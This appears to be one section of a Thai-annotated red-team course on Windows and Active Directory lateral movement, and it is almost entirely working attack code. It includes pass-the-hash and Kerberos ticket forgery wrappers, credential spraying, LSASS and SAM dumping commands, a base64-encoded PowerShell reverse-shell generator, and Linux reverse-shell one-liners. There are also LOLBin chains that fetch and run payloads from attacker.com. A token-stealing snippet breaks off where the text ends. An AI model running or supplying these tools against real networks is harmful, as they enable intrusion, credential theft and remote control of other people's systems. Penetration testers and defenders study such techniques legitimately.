# Part 71: Advanced Red Team - Lateral Movement (Steps 701-710)

## Step 701: Pass-the-Hash and Pass-the-Ticket

```python
import subprocess
import re
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple


@dataclass
class Credential:
    """Credential ที่ได้จาก target system"""
    username: str
    domain: str
    credential_type: str  # ntlm, kerberos, plaintext
    value: str  # hash or password
    source: str  # lsass, ntds, etc.
    valid: bool = False


class CredentialAttacks:
    """เทคนิคการโจมตีด้วย credentials"""
    
    def pass_the_hash_impacket(self, target: str, username: str, 
                                 domain: str, nt_hash: str,
                                 command: str = 'whoami') -> str:
        """Pass-the-Hash ด้วย impacket wmiexec"""
        # Format: DOMAIN/user:hash@target
        cmd = [
            'python3', '-m', 'impacket.examples.wmiexec',
            f'{domain}/{username}@{target}',
            '-hashes', f':{nt_hash}',
            command
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout
    
    def pass_the_hash_crackmapexec(self, targets: List[str], username: str,
                                     domain: str, nt_hash: str,
                                     module: str = None) -> List[Dict]:
        """ใช้ CrackMapExec สำหรับ Pass-the-Hash"""
        results = []
        
        for target in targets:
            cmd = [
                'crackmapexec', 'smb', target,
                '-u', username,
                '-d', domain,
                '-H', nt_hash,
            ]
            
            if module:
                cmd.extend(['-M', module])
            else:
                cmd.extend(['--exec-method', 'smbexec', '-x', 'whoami'])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            output = result.stdout
            
            # Parse success/failure
            success = '[+]' in output and 'Pwn3d!' in output
            results.append({
                'target': target,
                'success': success,
                'output': output
            })
        
        return results
    
    def request_tgt(self, username: str, domain: str, 
                     password: str, dc_ip: str) -> Optional[str]:
        """ขอ TGT (Ticket Granting Ticket)"""
        cmd = [
            'python3', '-m', 'impacket.examples.getTGT',
            f'{domain}/{username}:{password}',
            '-dc-ip', dc_ip
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        if 'Saving ticket' in result.stdout:
            ticket_file = f'{username}.ccache'
            return ticket_file
        return None
    
    def pass_the_ticket(self, ticket_file: str, target: str,
                         command: str = 'whoami') -> str:
        """Pass-the-Ticket attack"""
        import os
        os.environ['KRB5CCNAME'] = ticket_file
        
        cmd = [
            'python3', '-m', 'impacket.examples.psexec',
            '-k', '-no-pass',
            target, command
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout
    
    def over_pass_the_hash(self, username: str, domain: str,
                            nt_hash: str, dc_ip: str) -> Optional[str]:
        """Overpass-the-Hash: NTLM -> Kerberos TGT"""
        # Request TGT using NTLM hash via Rubeus/impacket
        cmd = [
            'python3', '-m', 'impacket.examples.getTGT',
            f'{domain}/{username}',
            '-hashes', f':{nt_hash}',
            '-dc-ip', dc_ip
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        if 'Saving ticket' in result.stdout:
            return f'{username}.ccache'
        return None
    
    def kerberoast_attack(self, username: str, password: str,
                           domain: str, dc_ip: str) -> List[Dict]:
        """Kerberoasting attack - สะสม TGS tickets"""
        cmd = [
            'python3', '-m', 'impacket.examples.GetUserSPNs',
            f'{domain}/{username}:{password}',
            '-dc-ip', dc_ip,
            '-request',
            '-outputfile', '/tmp/kerberoast.txt'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        tickets = []
        if result.returncode == 0:
            # Parse output
            for line in result.stdout.split('\n'):
                if 'ServicePrincipalName' in line or '$krb5tgs$' in line:
                    tickets.append({'ticket_data': line})
        
        return tickets
    
    def asreproast_attack(self, userlist: List[str], domain: str,
                           dc_ip: str) -> List[Dict]:
        """ASREPRoasting - สร้าง hashes จาก accounts ที่ไม่ต้องการ pre-auth"""
        users_file = '/tmp/users.txt'
        with open(users_file, 'w') as f:
            f.write('\n'.join(userlist))
        
        cmd = [
            'python3', '-m', 'impacket.examples.GetNPUsers',
            f'{domain}/',
            '-usersfile', users_file,
            '-dc-ip', dc_ip,
            '-format', 'hashcat',
            '-outputfile', '/tmp/asrep_hashes.txt',
            '-no-pass'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        hashes = []
        for line in result.stdout.split('\n'):
            if '$krb5asrep$' in line:
                hashes.append({
                    'type': 'asrep',
                    'hash': line.strip()
                })
        
        return hashes
    
    def golden_ticket_attack(self, username: str, domain: str,
                              domain_sid: str, krbtgt_hash: str,
                              user_id: int = 500) -> str:
        """สร้าง Golden Ticket"""
        cmd = [
            'python3', '-m', 'impacket.examples.ticketer',
            '-nthash', krbtgt_hash,
            '-domain-sid', domain_sid,
            '-domain', domain,
            '-user-id', str(user_id),
            '-groups', '512,513,518,519,520',
            username
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        if 'Saving ticket' in result.stdout:
            return f'{username}.ccache'
        return ''
    
    def silver_ticket_attack(self, username: str, domain: str,
                              domain_sid: str, service_hash: str,
                              target_service: str, target_host: str) -> str:
        """สร้าง Silver Ticket สำหรับ specific service"""
        cmd = [
            'python3', '-m', 'impacket.examples.ticketer',
            '-nthash', service_hash,
            '-domain-sid', domain_sid,
            '-domain', domain,
            '-spn', f'{target_service}/{target_host}',
            username
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        if 'Saving ticket' in result.stdout:
            return f'{username}.ccache'
        return ''
```

## Step 702: SMB Lateral Movement

```python
import subprocess
import socket
import struct
from dataclasses import dataclass
from typing import List, Dict, Optional
from pathlib import Path


class SMBLateralMovement:
    """เครื่องมือ lateral movement ผ่าน SMB"""
    
    def execute_via_smbexec(self, target: str, username: str,
                             password: str, domain: str,
                             command: str) -> str:
        """รันคำสั่งผ่าน SMBExec"""
        cmd = [
            'python3', '-m', 'impacket.examples.smbexec',
            f'{domain}/{username}:{password}@{target}',
            '-c', command
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout
    
    def execute_via_psexec(self, target: str, username: str,
                            password: str, domain: str,
                            command: str) -> str:
        """รันคำสั่งผ่าน PsExec"""
        cmd = [
            'python3', '-m', 'impacket.examples.psexec',
            f'{domain}/{username}:{password}@{target}',
            command
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout
    
    def execute_via_wmiexec(self, target: str, username: str,
                             password: str, domain: str,
                             command: str) -> str:
        """รันคำสั่งผ่าน WMI"""
        cmd = [
            'python3', '-m', 'impacket.examples.wmiexec',
            f'{domain}/{username}:{password}@{target}',
            command
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout
    
    def execute_via_atexec(self, target: str, username: str,
                            password: str, domain: str,
                            command: str) -> str:
        """รันคำสั่งผ่าน Task Scheduler (atexec)"""
        cmd = [
            'python3', '-m', 'impacket.examples.atexec',
            f'{domain}/{username}:{password}@{target}',
            command
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout
    
    def spray_and_move(self, targets: List[str], 
                        credentials: List[Dict]) -> List[Dict]:
        """Spray credentials across multiple targets"""
        results = []
        
        for target in targets:
            for cred in credentials:
                username = cred.get('username', '')
                domain = cred.get('domain', '')
                password = cred.get('password', '')
                nt_hash = cred.get('nt_hash', '')
                
                # เลือกวิธีตามประเภท credential
                if nt_hash:
                    output = self._try_pth(target, username, domain, nt_hash)
                elif password:
                    output = self.execute_via_wmiexec(
                        target, username, password, domain, 'whoami'
                    )
                else:
                    continue
                
                success = 'nt authority\\system' in output.lower() or username.lower() in output.lower()
                
                if success:
                    results.append({
                        'target': target,
                        'username': username,
                        'domain': domain,
                        'method': 'pth' if nt_hash else 'password',
                        'output': output[:200]
                    })
                    break  # Found working creds for this target
        
        return results
    
    def _try_pth(self, target: str, username: str, 
                  domain: str, nt_hash: str) -> str:
        """Try Pass-the-Hash"""
        cmd = [
            'crackmapexec', 'smb', target,
            '-u', username, '-d', domain,
            '-H', nt_hash, '-x', 'whoami'
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        return result.stdout
    
    def mount_smb_share(self, target: str, share: str,
                         username: str, password: str,
                         mount_point: str = '/mnt/smb') -> bool:
        """Mount SMB share"""
        Path(mount_point).mkdir(parents=True, exist_ok=True)
        
        result = subprocess.run(
            ['mount', '-t', 'cifs',
             f'//{target}/{share}', mount_point,
             '-o', f'username={username},password={password}'],
            capture_output=True, text=True
        )
        return result.returncode == 0
    
    def enumerate_smb_shares(self, target: str, username: str,
                              password: str, domain: str) -> List[Dict]:
        """หา SMB shares"""
        cmd = [
            'python3', '-m', 'impacket.examples.smbclient',
            f'{domain}/{username}:{password}@{target}',
            '-c', 'shares'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        shares = []
        for line in result.stdout.split('\n'):
            line = line.strip()
            if line and not line.startswith('Type') and not line.startswith('--'):
                parts = line.split()
                if parts:
                    shares.append({
                        'name': parts[0],
                        'type': parts[1] if len(parts) > 1 else 'unknown',
                        'comment': ' '.join(parts[2:]) if len(parts) > 2 else ''
                    })
        
        return shares
```

## Step 703: WMI and PowerShell Remoting

```python
import subprocess
from dataclasses import dataclass
from typing import List, Dict, Optional


class RemoteExecutionTechniques:
    """เทคนิคการรัน commands บน remote systems"""
    
    def wmi_execute(self, target: str, username: str, 
                     password: str, command: str) -> Dict:
        """รันคำสั่งผ่าน WMI (Windows Management Instrumentation)"""
        cmd = [
            'python3', '-m', 'impacket.examples.wmiexec',
            f'{username}:{password}@{target}',
            command
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return {
            'target': target,
            'command': command,
            'output': result.stdout,
            'success': result.returncode == 0
        }
    
    def wmi_query(self, target: str, username: str,
                   password: str, wql: str) -> List[Dict]:
        """เรียกใช้ WQL query"""
        # ใช้ impacket WMI client
        from impacket.dcerpc.v5 import dcom, wmi as wmiclient
        
        # คียู connection flow:
        # dcom.DCOMConnection -> IWbemServices -> ExecQuery
        
        return []  # ผลลัพธ์ WQL
    
    def powershell_remoting(self, target: str, username: str,
                             password: str, domain: str,
                             command: str) -> str:
        """รัน PowerShell ผ่าน WinRM"""
        # ใช้ evil-winrm
        cmd = [
            'evil-winrm',
            '-i', target,
            '-u', username,
            '-p', password,
            '-c', command
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout
    
    def generate_ps_reverse_shell(self, lhost: str, lport: int) -> str:
        """สร้าง PowerShell reverse shell payload"""
        # Base reverse shell
        ps_code = f"""
$client = New-Object System.Net.Sockets.TCPClient('{lhost}', {lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
"""
        # Encode to base64
        import base64
        encoded = base64.b64encode(ps_code.encode('utf-16-le')).decode()
        return f"powershell -enc {encoded}"
    
    def dcom_execute(self, target: str, username: str,
                      password: str, command: str) -> str:
        """รันคำสั่งผ่าน DCOM"""
        cmd = [
            'python3', '-m', 'impacket.examples.dcomexec',
            f'{username}:{password}@{target}',
            command
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout
    
    def ssh_lateral_move(self, target: str, username: str,
                          key_file: str, command: str) -> str:
        """ย้ายผ่าน SSH ด้วย stolen key"""
        cmd = [
            'ssh',
            '-i', key_file,
            '-o', 'StrictHostKeyChecking=no',
            '-o', 'UserKnownHostsFile=/dev/null',
            f'{username}@{target}',
            command
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout


class LivingOffTheLand:
    """เทคนิค Living off the Land (LOLBins)"""
    
    WINDOWS_LOLBINS = {
        'certutil': {
            'download': 'certutil.exe -urlcache -split -f {url} {output}',
            'encode': 'certutil.exe -encode {input} {output}',
            'decode': 'certutil.exe -decode {input} {output}'
        },
        'mshta': {
            'exec_vbs': 'mshta.exe vbscript:CreateObject("WScript.Shell").Run("{cmd}",0,True)(window.close)',
            'exec_url': 'mshta.exe http://{server}/{file}.hta'
        },
        'wscript': {
            'exec': 'wscript.exe //E:VBScript //B {script}'
        },
        'regsvr32': {
            'exec_dll': 'regsvr32.exe /s /u /i:{url} scrobj.dll',
            'exec_local': 'regsvr32.exe /s /u /i:{path} scrobj.dll'
        },
        'rundll32': {
            'exec': 'rundll32.exe {dll},{function}',
            'javascript': 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";o=GetObject("script:{url}")'
        },
        'installutil': {
            'exec': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {assembly}'
        },
        'cmstp': {
            'exec': 'cmstp.exe /ni /s {inf_file}'
        },
        'msiexec': {
            'remote': 'msiexec.exe /q /i http://{server}/{file}.msi'
        },
        'powershell': {
            'bypass': 'powershell.exe -ep bypass -nop -w hidden -c {command}',
            'encoded': 'powershell.exe -enc {base64_cmd}',
            'from_url': 'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{server}/{file}\')"'
        },
        'wmic': {
            'exec': 'wmic.exe process call create "{command}"',
            'remote': 'wmic.exe /node:{target} /user:{user} /password:{pass} process call create "{command}"'
        }
    }
    
    LINUX_LOLBINS = {
        'python': 'python3 -c "import os; os.system(\'{command}\')"',
        'perl': 'perl -e \'use POSIX;POSIX::system("{command}");'\''',
        'bash_tcp': 'bash -i >& /dev/tcp/{host}/{port} 0>&1',
        'nc_traditional': 'nc -e /bin/sh {host} {port}',
        'nc_ncat': 'ncat --exec /bin/sh {host} {port}',
        'socat': 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{host}:{port}',
        'awk': "awk 'BEGIN {{s = \"/inet/tcp/0/{host}/{port}\"; while(42) {{do {{ printf \"shell>\" |& s; s |& getline c; if (c) {{while ((c |& getline) > 0) print $0 |& s; close(c)}} }} while(c != \"exit\") }}}}'",
        'curl_pipe': 'curl -s http://{server}/{script} | bash',
        'wget_pipe': 'wget -qO- http://{server}/{script} | bash'
    }
    
    def get_lolbin_command(self, os_type: str, tool: str, 
                            action: str, **kwargs) -> Optional[str]:
        """ดึง LOLBin command"""
        if os_type == 'windows':
            tool_cmds = self.WINDOWS_LOLBINS.get(tool, {})
            template = tool_cmds.get(action, '')
        else:
            template = self.LINUX_LOLBINS.get(tool, '')
        
        if template:
            try:
                return template.format(**kwargs)
            except KeyError as e:
                return None
        return None
    
    def generate_lolbin_chain(self, objective: str) -> List[str]:
        """สร้าง LOLBin chain สำหรับ objective"""
        chains = {
            'download_execute': [
                'certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\\Temp\\p.exe',
                'C:\\Temp\\p.exe'
            ],
            'memory_execute': [
                'powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/ps.txt\')"'
            ],
            'persistence_reg': [
                'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "wscript.exe C:\\Temp\\update.vbs" /f'
            ],
            'lateral_movement': [
                'wmic.exe /node:{target} /user:{user} /password:{pass} process call create "powershell -enc {b64cmd}"'
            ]
        }
        return chains.get(objective, [])
```

## Step 704: Active Directory Lateral Movement

```python
import subprocess
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set


class ActiveDirectoryLateralMovement:
    """เครื่องมือ lateral movement ใน Active Directory"""
    
    def enumerate_ad_users(self, domain: str, username: str,
                             password: str, dc_ip: str) -> List[Dict]:
        """สำรวจ AD users"""
        cmd = [
            'python3', '-m', 'impacket.examples.GetADUsers',
            '-all', f'{domain}/{username}:{password}',
            '-dc-ip', dc_ip
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        users = []
        for line in result.stdout.split('\n'):
            if '  ' in line and not line.startswith('Name'):
                parts = line.split()
                if parts:
                    users.append({'username': parts[0]})
        
        return users
    
    def enumerate_ad_computers(self, domain: str, username: str,
                                password: str, dc_ip: str) -> List[Dict]:
        """สำรวจ AD computers"""
        cmd = [
            'crackmapexec', 'ldap', dc_ip,
            '-u', username, '-p', password,
            '-d', domain, '--computers'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        computers = []
        for line in result.stdout.split('\n'):
            if '$' in line:
                computers.append({'name': line.strip()})
        
        return computers
    
    def find_admin_accounts(self, domain: str, username: str,
                             password: str, dc_ip: str) -> List[Dict]:
        """หา accounts ที่มีสิทธิ์ admin"""
        # BloodHound-style query
        cmd = [
            'crackmapexec', 'ldap', dc_ip,
            '-u', username, '-p', password,
            '-d', domain,
            '-M', 'get-desc-users'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return []
    
    def dump_domain_hash(self, target_dc: str, username: str,
                          password: str, domain: str) -> List[Dict]:
        """ดึง hash จาก domain controller (secretsdump)"""
        cmd = [
            'python3', '-m', 'impacket.examples.secretsdump',
            f'{domain}/{username}:{password}@{target_dc}',
            '-just-dc-ntlm',
            '-output', '/tmp/domain_hashes'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        hashes = []
        for line in result.stdout.split('\n'):
            if ':' in line and '::' not in line:
                parts = line.split(':')
                if len(parts) >= 4:
                    hashes.append({
                        'username': parts[0],
                        'rid': parts[1],
                        'lm_hash': parts[2],
                        'nt_hash': parts[3],
                        'domain': domain
                    })
        
        return hashes
    
    def bloodhound_collection(self, domain: str, username: str,
                               password: str, dc_ip: str,
                               collection_method: str = 'All') -> str:
        """เก็บข้อมูล BloodHound"""
        cmd = [
            'bloodhound-python',
            '-u', username,
            '-p', password,
            '-d', domain,
            '-dc', dc_ip,
            '-c', collection_method,
            '--zip'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        
        if result.returncode == 0:
            return '/tmp/bloodhound_data.zip'
        return ''
    
    def find_attack_paths(self, target_user: str, 
                           bloodhound_data: Dict) -> List[List[str]]:
        """วิเคราะห์ attack paths จาก BloodHound data"""
        # หา paths ไปยัง target (ความง่ายในการเข้าถึง)
        paths = []
        
        # ตุงเป็น Domain Admin paths
        da_paths = [
            ['User -> GenericAll -> Group -> Domain Admin'],
            ['User -> CanRDP -> Computer -> HasSession -> Domain Admin'],
            ['User -> Kerberoastable -> Computer -> LocalAdmin -> Domain Admin'],
            ['User -> DCSync -> Domain -> Domain Admin']
        ]
        
        return da_paths
    
    def constrained_delegation_attack(self, username: str, password: str,
                                       domain: str, dc_ip: str,
                                       target_spn: str) -> str:
        """โจมตีด้วย Constrained Delegation"""
        # S4U2Self + S4U2Proxy
        cmd = [
            'python3', '-m', 'impacket.examples.getST',
            '-spn', target_spn,
            '-impersonate', 'administrator',
            f'{domain}/{username}:{password}',
            '-dc-ip', dc_ip
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        if 'Saving ticket' in result.stdout:
            return 'administrator.ccache'
        return ''
    
    def rbcd_attack(self, attacker_computer: str, target_computer: str,
                     domain: str, username: str, password: str,
                     dc_ip: str) -> str:
        """โจมตีด้วย Resource-Based Constrained Delegation (RBCD)"""
        # Step 1: ตั้งค่า msDS-AllowedToActOnBehalfOfOtherIdentity
        cmd = [
            'python3', '-m', 'impacket.examples.rbcd',
            '-action', 'write',
            '-delegate-to', target_computer,
            '-delegate-from', attacker_computer,
            f'{domain}/{username}:{password}',
            '-dc-ip', dc_ip
        ]
        
        result1 = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        # Step 2: ขอ TGS ticket
        if result1.returncode == 0:
            cmd2 = [
                'python3', '-m', 'impacket.examples.getST',
                '-spn', f'CIFS/{target_computer}',
                '-impersonate', 'administrator',
                f'{domain}/{attacker_computer}$',
                '-dc-ip', dc_ip
            ]
            result2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=30)
            
            if 'Saving ticket' in result2.stdout:
                return 'administrator.ccache'
        
        return ''
```

## Step 705: Network Pivoting and Tunneling

```python
import subprocess
from dataclasses import dataclass, field
from typing import List, Dict, Optional
import socket
import threading


class NetworkPivoting:
    """เครื่องมือ network pivoting และ tunneling"""
    
    def create_socks_proxy_via_ssh(self, jump_host: str, 
                                    username: str, key_file: str,
                                    local_port: int = 1080) -> subprocess.Popen:
        """สร้าง SOCKS proxy ผ่าน SSH dynamic port forwarding"""
        cmd = [
            'ssh',
            '-N', '-D', f'127.0.0.1:{local_port}',
            '-i', key_file,
            '-o', 'StrictHostKeyChecking=no',
            '-o', 'UserKnownHostsFile=/dev/null',
            f'{username}@{jump_host}'
        ]
        
        process = subprocess.Popen(cmd)
        print(f"[+] SOCKS5 proxy on 127.0.0.1:{local_port} via {jump_host}")
        return process
    
    def create_local_port_forward(self, jump_host: str, 
                                   username: str, key_file: str,
                                   local_port: int,
                                   remote_host: str, remote_port: int) -> subprocess.Popen:
        """สร้าง local port forward (-L)"""
        cmd = [
            'ssh',
            '-N', '-L',
            f'{local_port}:{remote_host}:{remote_port}',
            '-i', key_file,
            '-o', 'StrictHostKeyChecking=no',
            f'{username}@{jump_host}'
        ]
        
        process = subprocess.Popen(cmd)
        print(f"[+] Port forward: 127.0.0.1:{local_port} -> {remote_host}:{remote_port} via {jump_host}")
        return process
    
    def create_reverse_port_forward(self, attack_server: str,
                                     username: str, key_file: str,
                                     attack_port: int,
                                     target_host: str, target_port: int) -> subprocess.Popen:
        """สร้าง reverse port forward (-R)"""
        cmd = [
            'ssh',
            '-N', '-R',
            f'{attack_port}:{target_host}:{target_port}',
            '-i', key_file,
            '-o', 'StrictHostKeyChecking=no',
            f'{username}@{attack_server}'
        ]
        
        process = subprocess.Popen(cmd)
        print(f"[+] Reverse forward: attack:{attack_port} -> {target_host}:{target_port}")
        return process
    
    def setup_chisel_server(self, port: int = 8080) -> subprocess.Popen:
        """เริ่ม Chisel server สำหรับ TCP tunneling"""
        cmd = ['chisel', 'server', '-p', str(port), '--reverse']
        process = subprocess.Popen(cmd)
        print(f"[+] Chisel server running on port {port}")
        return process
    
    def generate_chisel_client_cmd(self, server: str, port: int,
                                    tunnels: List[str]) -> str:
        """Generate Chisel client command"""
        # tunnels: ["R:0.0.0.0:8888:127.0.0.1:80"]
        tunnels_str = ' '.join(tunnels)
        return f"chisel client {server}:{port} {tunnels_str}"
    
    def setup_ligolo_ng(self, server_ip: str, 
                         agent_ip: str) -> Dict[str, str]:
        """สร้าง Ligolo-ng tunnel"""
        commands = {
            'server_start': f"./proxy -selfcert -laddr 0.0.0.0:11601",
            'agent_connect': f"./agent -connect {server_ip}:11601 -ignore-cert",
            'ligolo_setup': "interface_create --name ligolo ; tunnel_start --tun ligolo",
            'route_add': f"ip route add 192.168.1.0/24 dev ligolo"
        }
        return commands
    
    def proxychains_config(self, proxy_type: str = 'socks5',
                            proxy_host: str = '127.0.0.1',
                            proxy_port: int = 1080) -> str:
        """Generate proxychains config"""
        return f"""
strict_chain
quiet_mode

proxy_dns 

[ProxyList]
{proxy_type} {proxy_host} {proxy_port}
"""
    
    def generate_pivot_diagram(self, pivot_hosts: List[Dict]) -> str:
        """สร้างแผนผัง pivot network"""
        diagram = ["Pivot Network Diagram", "=" * 40]
        
        for i, host in enumerate(pivot_hosts):
            prefix = "Attacker" if i == 0 else f"Pivot {i}"
            diagram.append(
                f"{prefix}: {host['ip']} ({host.get('os', 'unknown')}) -> "
                f"{host.get('can_reach', 'N/A')}"
            )
        
        return '\n'.join(diagram)
```

## Step 706: Credential Dumping Techniques

```python
import subprocess
import os
from dataclasses import dataclass, field
from typing import List, Dict, Optional


class CredentialDumping:
    """เทคนิคการดึง credentials"""
    
    def dump_lsass(self, method: str = 'comsvcs') -> Dict:
        """ดึง LSASS memory"""
        methods = {
            'comsvcs': {
                'cmd': 'rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump {pid} C:\\Temp\\lsass.dmp full',
                'parse': 'python3 -m impacket.examples.secretsdump -system SYSTEM -ntds ntds.dit local'
            },
            'procdump': {
                'cmd': 'procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp',
                'parse': 'mimikatz.exe "sekurlsa::minidump C:\\Temp\\lsass.dmp" "sekurlsa::logonpasswords"'
            },
            'task_manager': {
                'cmd': '# Right-click lsass.exe -> Create dump file',
                'parse': 'mimikatz sekurlsa::minidump lsass.dmp'
            },
            'createdump': {
                'cmd': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\createdump.exe -u -f C:\\Temp\\lsass.dmp {pid}',
                'parse': 'pypykatz lsa minidump C:\\Temp\\lsass.dmp'
            },
            'nanodump': {
                'cmd': 'nanodump.x64.exe --write C:\\Temp\\lsass.dmp --valid',
                'parse': 'pypykatz lsa minidump C:\\Temp\\lsass.dmp'
            }
        }
        return methods.get(method, {})
    
    def dump_sam_hive(self) -> List[str]:
        """ดึง SAM database"""
        commands = [
            # Save registry hives
            'reg.exe save HKLM\\SAM C:\\Temp\\sam.hive',
            'reg.exe save HKLM\\SYSTEM C:\\Temp\\system.hive',
            'reg.exe save HKLM\\SECURITY C:\\Temp\\security.hive',
            # Parse with impacket
            'python3 -m impacket.examples.secretsdump -sam C:\\Temp\\sam.hive -system C:\\Temp\\system.hive -security C:\\Temp\\security.hive LOCAL'
        ]
        return commands
    
    def dump_dpapi_credentials(self) -> List[str]:
        """ดึง DPAPI credentials"""
        commands = [
            # List DPAPI blobs
            'python3 -m impacket.examples.dpapi masterkey -file C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Protect\\{SID}\\{GUID}',
            # Decrypt credentials
            'python3 -m impacket.examples.dpapi credential -file C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Credentials\\{hash}',
        ]
        return commands
    
    def parse_lsass_dump(self, dump_file: str) -> List[Dict]:
        """วิเคราะห์ LSASS dump ด้วย pypykatz"""
        cmd = [
            'pypykatz', 'lsa', 'minidump', dump_file, '--json'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        credentials = []
        try:
            import json
            data = json.loads(result.stdout)
            
            for session in data.get('logon_sessions', {}).values():
                username = session.get('username', '')
                domain = session.get('domainname', '')
                
                # MSV (NTLM)
                for msv in session.get('msv_creds', []):
                    credentials.append({
                        'type': 'NTLM',
                        'username': username,
                        'domain': domain,
                        'nt_hash': msv.get('NThash', ''),
                        'lm_hash': msv.get('LMhash', '')
                    })
                
                # Wdigest
                for wdigest in session.get('wdigest_creds', []):
                    if wdigest.get('password'):
                        credentials.append({
                            'type': 'Plaintext',
                            'username': username,
                            'domain': domain,
                            'password': wdigest['password']
                        })
        except Exception:
            pass
        
        return credentials
    
    def extract_browser_passwords(self) -> List[Dict]:
        """ดึง passwords จาก browser (Linux)"""
        credentials = []
        
        # Firefox passwords
        firefox_profiles = []
        import glob
        firefox_dirs = glob.glob(os.path.expanduser('~/.mozilla/firefox/*.default*'))
        
        for profile_dir in firefox_dirs:
            logins_file = os.path.join(profile_dir, 'logins.json')
            if os.path.exists(logins_file):
                credentials.append({
                    'type': 'Firefox',
                    'path': logins_file,
                    'note': 'Use firefox_decrypt to extract'
                })
        
        # Chrome passwords
        chrome_login = os.path.expanduser(
            '~/.config/google-chrome/Default/Login Data'
        )
        if os.path.exists(chrome_login):
            credentials.append({
                'type': 'Chrome',
                'path': chrome_login,
                'note': 'Encrypted with user keyring'
            })
        
        return credentials
```

## Step 707: Token Manipulation and Impersonation

```python
from dataclasses import dataclass
from typing import List, Dict, Optional


class TokenManipulation:
    """Token manipulation techniques (Windows)"""
    
    POWERSHELL_TOKEN_COMMANDS = {
        'list_tokens': """
# List available tokens (requires Incognito or similar)
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]).Value }
""",
        'check_privileges': """
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
$principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
""",
        'impersonate': """
# Impersonate another user's token
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class TokenImpersonation {
    [DllImport("advapi32.dll")]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
}
"@
"""  
    }
    
    INCOGNITO_COMMANDS = {
        'list_tokens': 'execute_assembly Incognito.exe list_tokens -u',
        'impersonate_user': 'execute_assembly Incognito.exe impersonate_user "DOMAIN\\user"',
        'add_user': 'execute_assembly Incognito.exe add_user newadmin Password123! BUILTIN\\Administrators'
    }
    
    def generate_token_stealing_code(self) -> str:
        """Generate token stealing PoC code"""
        return """
import ctypes
import ctypes.wintypes as wintypes

kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32

# Constants
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATE = 0x0004
TOKEN_QUERY = 0x0008
SECURITY_IMPERSONATION_LEVEL = 2
TOKEN_TYPE_PRIMARY = 1
TOKEN_TYPE_IMPERSONATION = 2

def steal_token(pid: int) -> wintypes.HANDLE:
    """Steal token from process by PID"""
    # Open target process
    h_process = kernel32.OpenProcess(
        PROCESS_QUERY_LIMITED_INFORMATION, False, pid
    )
